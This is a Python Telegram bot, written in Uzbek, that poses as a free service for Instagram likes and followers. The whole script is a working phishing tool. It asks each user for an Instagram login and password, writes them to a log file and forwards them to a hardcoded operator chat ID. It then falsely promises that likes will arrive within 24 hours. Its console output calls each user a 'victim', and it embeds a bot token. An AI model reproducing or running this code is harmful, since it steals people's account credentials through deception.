import telebot
from telebot import *
import time
import random
print("Bot ishga tushdi😻")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '5486079487'
bot = telebot.TeleBot("5876218015:AAGE_oK_Lv5i31Y0yK-Yi8FraMuZVH5i714")
try:
	bot.send_message(ID, 'Bot ishga tushdi😻') 
except:
	print("Balki siz botingizda /start yozmagandirsiz! Ushbu harakatsiz skript to'g'ri ishlamaydi😾!")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Qurbon Aniqlandi 😹
Bechoraning ID Raqami: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''Asalomu aleykum👋
Tekin nakrutka🫂 urivchi botimizga hush kelibsiz ☺️

Nakrutka hizmatidan foydalanmoqch bolsangiz😍

/Instagram ni 👈  ustiga bosing''') 

@bot.message_handler(commands=['Rasul'])
def Rasul(message):
	bot.send_message(message.chat.id, 'Salom') 

@bot.message_handler(commands=['Instagram', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Layk❤️", callback_data="like")
	second_button = types.InlineKeyboardButton(text="Obunachi👥", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Kerakli hizmatni tanlang😻", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Kerakli Layk❤️ sonini kiriting (maksimal 500)') 
		bot.register_next_step_handler(msg, qproc1)

	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, 'Obunachilar👤 sonini kiriting (maksimal 100)') 
		bot.register_next_step_handler(msg, qproc2)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Miqdorni raqam sifatida kiriting😿  /Instagram ni yozib qaytadan urinib koring 😺')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Likelar❤️ soni 500 dan oshmasligi kerak 😾!')
			return
		else:
			bot.send_message(message.chat.id, f'Layklar soni ❤️ : {num}')
			msg = bot.send_message(message.chat.id, 'Instagram😻 hisobingizning emal yoki Telefon Raqamingizni kiriting 😺:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, 'Miqdorni raqam sifatida kiriting😿  /Instagram ni yozib qaytadan urinib koring 😺!')#⏳
			return
		elif int(num) > 100:
			bot.reply_to(message, 'Obunachilar👤 soni 100 dan oshmasligi kerak 😾!')
			return
		else:
			bot.send_message(message.chat.id, f'Obunachilar👤 soni: {num}')
			msg = bot.send_message(message.chat.id, 'Instagram😻 hisobingizning emal yoki Telefon Raqamingizni kiriting😺:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def step1(message):
	get = f'''Foydalanuvchi malumotlari 
ID: {message.from_user.id}
username: @{message.from_user.username}
Login: {message.text}
isim: {message.from_user.first_name}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'Loginingiz😺: {message.text}')

	msg1 = bot.send_message(message.chat.id, 'Instagram hisobingiz parolini kiriting🙃:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''Foydalanuvchi malumotlari
ID: {message.from_user.id}
Username: @{message.from_user.username}
Parol: {usrpass}
useri: {message.from_user.first_name}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'Parol tastiqlandi🔐❤ : {usrpass}')
	time.sleep(1)
	bot.reply_to(message, f'Xizmatimizdan😸 foydalanganingiz uchun tashakkur! Agar kiritilgan malumotlaringiz togri bolsa😼, 24 soat ichida hisobinizga nakrutka uriladi😻')


bot.polling()
		